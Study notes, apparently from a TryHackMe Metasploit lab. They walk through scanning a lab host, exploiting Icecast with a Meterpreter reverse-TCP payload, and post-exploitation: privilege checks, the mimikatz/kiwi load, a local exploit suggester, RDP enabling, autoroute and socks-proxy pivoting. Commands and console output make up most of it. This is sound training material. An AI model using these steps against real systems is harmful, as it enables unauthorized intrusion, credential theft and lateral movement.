# Metasploit

Metasploit is a open-source tool used for pentesting, which contains a collection of heavily-tested exploits, post-exploit tools, and auxiliary scripts

## Init Metasploit

- Init the internal db with `msfdb init`
- Check Metasploit commands with `msfconsole -h`
- Open with `msfconsole`

## Basic console commands

- Check the internal db status in the console with `db_status` after init-ing it
- `help` or `?` prints available commands and tips
  - `help [cmd]` will show options for a certain command
- `search [name]` is used to search for exploits and other scripts for whatever it might have
  - i.e. `search mysql` or `search smb`
- `use [name|number]` sets the script to use. can use the number from the `search` results
- `info [name|number]` shows basic info about a script. same number deal as `use`
- `connect` will try to make a quick connection to a host to confirm we can use it
- `banner` prints the banner
- `set` sets a variable to a given value once a script is `use`-d
- `setg` sets a global variable to use in all scripts for that session
  - Most useful for the `RHOSTS` option
- `get` shows the value for a variable
- `unset` will change a variable to null/empty
- `spool <filepath>` will save output from a script into a file
- `save` allows you to save the previous session and exit

## Basic Modules (loaded in using `load`)

- Exploit - most common module; contains all the exploit scripts
- Payload - used alongside exploits usually; contains bits of shellcode to send certain payloads to an exploited server
- Encoder - used for payload obfuscation; used to help avoid signature detection
- NOP - used for buffer overflow and ROP attacks
- Post - used to 'loot and pivot' an attacked service after exploitation
- Auxiliary - used mostly for scanning and exploit verification

## Example Exploit using Metasploit

IP: `export thm_ip=10.10.245.86`

- Run Metasploit's built-in `nmap` runner using `db_nmap -sV 10.10.245.86`, which feeds directly into the database

```
msf6 > db_nmap -sV 10.10.245.86
[*] Nmap: Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-19 16:28 EDT
[*] Nmap: Nmap scan report for 10.10.245.86
[*] Nmap: Host is up (0.11s latency).
[*] Nmap: Not shown: 988 closed ports
[*] Nmap: PORT      STATE SERVICE            VERSION
[*] Nmap: 135/tcp   open  msrpc              Microsoft Windows RPC
[*] Nmap: 139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
[*] Nmap: 445/tcp   open  microsoft-ds       Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
[*] Nmap: 3389/tcp  open  ssl/ms-wbt-server?
[*] Nmap: 5357/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
[*] Nmap: 8000/tcp  open  http               Icecast streaming media server
[*] Nmap: 49152/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49153/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49154/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49158/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49159/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49160/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 72.48 seconds
```

- What service is running on port 135? [`msrpc`]
- Type `hosts`, `services`, and `vulns` to get info we've collected in the db
  - `hosts` will gather hosts looked at
  - `services` will gather services on the servers looked at
  - `vulns` will show possible vulnerabilities that might be possible if any

```
msf6 > hosts

Hosts
=====

address       mac  name  os_name  os_flavor  os_sp  purpose  info  comments
-------       ---  ----  -------  ---------  -----  -------  ----  --------
...
10.10.245.86             Unknown                    device
```

```
msf6 > services
Services
========

host          port   proto  name               state  info
----          ----   -----  ----               -----  ----
...
10.10.245.86  135    tcp    msrpc              open   Microsoft Windows RPC
10.10.245.86  139    tcp    netbios-ssn        open   Microsoft Windows netbios-ssn
10.10.245.86  445    tcp    microsoft-ds       open   Microsoft Windows 7 - 10 microsoft-ds workgroup: WORKGROUP
10.10.245.86  3389   tcp    ssl/ms-wbt-server  open
10.10.245.86  5357   tcp    http               open   Microsoft HTTPAPI httpd 2.0 SSDP/UPnP
10.10.245.86  8000   tcp    http               open   Icecast streaming media server
10.10.245.86  49152  tcp    msrpc              open   Microsoft Windows RPC
10.10.245.86  49153  tcp    msrpc              open   Microsoft Windows RPC
10.10.245.86  49154  tcp    msrpc              open   Microsoft Windows RPC
10.10.245.86  49158  tcp    msrpc              open   Microsoft Windows RPC
10.10.245.86  49159  tcp    msrpc              open   Microsoft Windows RPC
```

```
msf6 > vulns
Vulnerabilities
===============

Timestamp  Host  Name  References
---------  ----  ----  ----------

```

- Connect to the machine with a Metasploit payload. Type `use icecast` and find the full name of the script. [`exploit/windows/http/icecast_header`]

```
msf6 > use icecast
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp

Matching Modules
================

   #  Name                                 Disclosure Date  Rank   Check  Description
   -  ----                                 ---------------  ----   -----  -----------
   0  exploit/windows/http/icecast_header  2004-09-28       great  No     Icecast Header Overwrite


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/icecast_header

[*] Using exploit/windows/http/icecast_header
```

- That's not the right script, whoops. Search for the one we want using `search multi/handler`. Then do `use (NUMBER_NEXT_TO 'exploit/multi/header')`. What is the header for the numbers? [`#`]
  - This is up there for dumbest question lmao

```
msf6 exploit(windows/http/icecast_header) > search multi/handler

Matching Modules
================

   #  Name                                                 Disclosure Date  Rank       Check  Description
   -  ----                                                 ---------------  ----       -----  -----------
   0  exploit/linux/local/apt_package_manager_persistence  1999-03-09       excellent  No     APT Package Manager Persistence
   1  exploit/android/local/janus                          2017-07-31       manual     Yes    Android Janus APK Signature bypass
   2  auxiliary/scanner/http/apache_mod_cgi_bash_env       2014-09-24       normal     Yes    Apache mod_cgi Bash Environment Variable Injection (Shellshock) Scanner
   3  exploit/linux/local/bash_profile_persistence         1989-06-08       normal     No     Bash Profile Persistence
   4  exploit/linux/local/desktop_privilege_escalation     2014-08-07       excellent  Yes    Desktop Linux Password Stealer and Privilege Escalation
   5  exploit/multi/handler                                                 manual     No     Generic Payload Handler
   6  exploit/windows/mssql/mssql_linkcrawler              2000-01-01       great      No     Microsoft SQL Server Database Link Crawling Command Execution
   7  exploit/windows/browser/persits_xupload_traversal    2009-09-29       excellent  No     Persits XUpload ActiveX MakeHttpRequest Directory Traversal
   8  exploit/linux/local/yum_package_manager_persistence  2003-12-17       excellent  No     Yum Package Manager Persistence


Interact with a module by name or index. For example info 8, use 8 or use exploit/linux/local/yum_package_manager_persistence

msf6 exploit(windows/http/icecast_header) > use 5
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) >
```

- Set the local `PAYLOAD` variable to `windows/meterpreter/reverse_tcp` and the local `LHOST` to your `tun0` IP (VPN IP through THM, found through `ip addr`)

```
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST ************
LHOST => ************
msf6 exploit(multi/handler) > options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     ************      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target
```

- Return to the previous `exploit/windows/http/icecast_header` script by doing `use icecast`

```
msf6 exploit(multi/handler) > use icecast
[*] Using configured payload windows/meterpreter/reverse_tcp

Matching Modules
================

   #  Name                                 Disclosure Date  Rank   Check  Description
   -  ----                                 ---------------  ----   -----  -----------
   0  exploit/windows/http/icecast_header  2004-09-28       great  No     Icecast Header Overwrite


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/icecast_header

[*] Using exploit/windows/http/icecast_header
```

- Set the `RHOSTS` variable to the `thm_ip` you have

```
msf6 exploit(windows/http/icecast_header) > set RHOSTS 10.10.245.86
RHOSTS => 10.10.245.86
msf6 exploit(windows/http/icecast_header) > options

Module options (exploit/windows/http/icecast_header):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  10.10.245.86     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT   8000             yes       The target port (TCP)
```

- Use either `run -j` or `exploit` to run the script as a job

- Check the running jobs using `jobs`
  - This one tripped me up because I thought we should be looking for something here, apparently it's most likely gonna be empty unless you have 1mbps internet lol

```
msf6 exploit(windows/http/icecast_header) > jobs

Jobs
====

No active jobs.

```

- List all sessions with `sessions`, then interact with the session with `sessions -i #` to connect to the reverse shell

```
msf6 exploit(windows/http/icecast_header) > run -j
[*] Exploit running as background job 2.
[*] Exploit completed, but no session was created.
msf6 exploit(windows/http/icecast_header) > 
[*] Started reverse TCP handler on 10.6.89.232:4444 
[*] Sending stage (175174 bytes) to 10.10.245.86
[*] Meterpreter session 2 opened (10.6.89.232:4444 -> 10.10.245.86:49260) at 2021-07-19 17:38:59 -0400
***NOTE: I PRESSED ENTER HERE***
msf6 exploit(windows/http/icecast_header) > sessions

Active sessions
===============

  Id  Name  Type                     Information             Connection
  --  ----  ----                     -----------             ----------
  1         meterpreter x86/windows  Dark-PC\Dark @ DARK-PC  10.6.89.232:4444 -> 10.10.245.86:49250 (10.10.245.86)
  2         meterpreter x86/windows  Dark-PC\Dark @ DARK-PC  10.6.89.232:4444 -> 10.10.245.86:49260 (10.10.245.86)

msf6 exploit(windows/http/icecast_header) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > 
```

- List out options using `help` within `meterpreter`. It'll grow over time with the more modules we use
- We're in the shell of the victim machine. List processes with `ps`. What's the name of the `spool` service [`spoolsv.exe`]

```
Process List
============

 PID   PPID  Name                  Arch  Session  User          Path
 ---   ----  ----                  ----  -------  ----          ----
 0     0     [System Process]
 4     0     System
 ...
 1260  692   spoolsv.exe
 ...

```

- Move into the `spool` service. What command do we use to try to move? (It'll fail) [`migrate`]
  
```
meterpreter > migrate -N spoolsv.exe
[*] Migrating from 2304 to 1260...
[-] Error running command migrate: Rex::RuntimeError Cannot migrate into this process (insufficient privileges)
```

- What command can we use to find out more about the current user running the process we're in? [`getuid`]

```
Stdapi: System Commands
=======================
...
    getuid        Get the user that the server is running as
...
```

```
meterpreter > getuid
Server username: Dark-PC\Dark
```

- What command do we use to find more info about the machine? [`sysinfo`]

```
Stdapi: System Commands
=======================
...
    sysinfo       Gets information about the remote system, such as OS
...
```

```
meterpreter > sysinfo
Computer        : DARK-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
```

- What do we run to load the new version of `mimikatz` so we can use it? (also known as `kiwi`) [`load kiwi`]
  - Google search: `load mimikatz v2`
  - Found: [Github Comment for Metasploit to Upgrade](https://github.com/rapid7/metasploit-framework/issues/12020#issuecomment-551467136)
  - Note: need to be admin/system to load

- Find the privileges of the current user. What command was ran? [``]

```
Stdapi: System Commands
=======================
...
    getprivs      Attempt to enable all privileges available to the current process
...

```

```
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeChangeNotifyPrivilege
SeIncreaseWorkingSetPrivilege
SeShutdownPrivilege
SeTimeZonePrivilege
SeUndockPrivilege
```

- What command do we run to transfer files to our victim computer? [`upload`]

```
Stdapi: File system Commands
============================
...
    upload        Upload a file or directory
...
```

- How about if we want to run a Metasploit module? [`run`]

```
Core Commands
=============
...
    run                       Executes a meterpreter script or Post module
...

```

- What command do we run to figure out the networking information and interfaces on our victim? [`ipconfig`] <small>or <pre>ifconfig</pre> on Unix</small>

```
Stdapi: Networking Commands
===========================
...
    ifconfig      Display interfaces
    ipconfig      Display interfaces
...
```

```
meterpreter > ipconfig

Interface  1
============
Name         : Software Loopback Interface 1
Hardware MAC : 00:00:00:00:00:00
MTU          : 4294967295
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0
IPv6 Address : ::1
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff


Interface 12
============
Name         : Microsoft ISATAP Adapter
Hardware MAC : 00:00:00:00:00:00
MTU          : 1280
IPv6 Address : fe80::5efe:a0a:f556
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff


Interface 13
============
Name         : AWS PV Network Device #0
Hardware MAC : 02:0a:ac:01:fb:b9
MTU          : 9001
IPv4 Address : 10.10.245.86
IPv4 Netmask : 255.255.0.0
IPv6 Address : fe80::cce5:4cc:90cf:7266
IPv6 Netmask : ffff:ffff:ffff:ffff::
```

- Run `post/windows/gather/checkvm`. This will determine if we're in a VM, which can be useful for pivoting

```
meterpreter > run post/windows/gather/checkvm

[*] Checking if the target is a Virtual Machine ...
[+] This is a Xen Virtual Machine
```

- Run `post/multi/recon/local_exploit_suggester`. This will check for various exploits which we can run within our session to elevate our privileges.
  - The Ice room deals with how some of these work
  - There might be more, but it keeps failing for me after finding this first one

```
meterpreter > run post/multi/recon/local_exploit_suggester

[*] 10.10.245.86 - Collecting local exploits for x86/windows...
[*] 10.10.245.86 - 38 exploit checks are being tried...
[+] 10.10.245.86 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
```

- Let's try forcing RDP to be available. This won't work since we aren't administrators, however, this is a fun command to know about: `run post/windows/manage/enable_rdp`

```
meterpreter > run post/windows/manage/enable_rdp

[-] Insufficient privileges, Remote Desktop Service was not modified
[*] For cleanup execute Meterpreter resource file: /home/kali/.msf4/loot/20210719182359_default_10.10.245.86_host.windows.cle_452025.txt
```

- One quick extra question, what command can we run in our meterpreter session to spawn a normal system shell? [`shell`]

```
Stdapi: System Commands
=======================
...
    shell         Drop into a system command shell
...
```

```
meterpreter > shell
Process 2524 created.
Channel 2 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Program Files (x86)\Icecast2 Win32>
```

- Metaploit autorouting can help list different networks the machine is on

- Let's go ahead and run the command ~~`run autoroute -h`~~ `run post/multi/manage/autoroute` (***the command changed***), this will pull up the help menu for autoroute. What command do we run to add a route to the following subnet: `172.18.1.0/24`? Use the `-n` flag in your answer. [~~`run autoroute -s 172.18.1.0/24 -n 255.255.255.0`~~ `run post/multi/manage/autoroute SUBNET=172.18.1.0/24`]
  - The

- Additionally, we can start a socks5 proxy server out of this session. Background our current meterpreter session and run the command ~~`search server/socks5`~~ `search server/socks_proxy`. What is the full path to the socks5 auxiliary module? [~~`auxiliary/server/socks5`~~ `auxiliary/server/socks_proxy >>> set VERSION 5`]

- Once we've started a socks server we can modify our `/etc/proxychains.conf` file to include our new server. What command do we prefix our commands (outside of Metasploit) to run them through our socks5 server with `proxychains`? [`proxychains`]
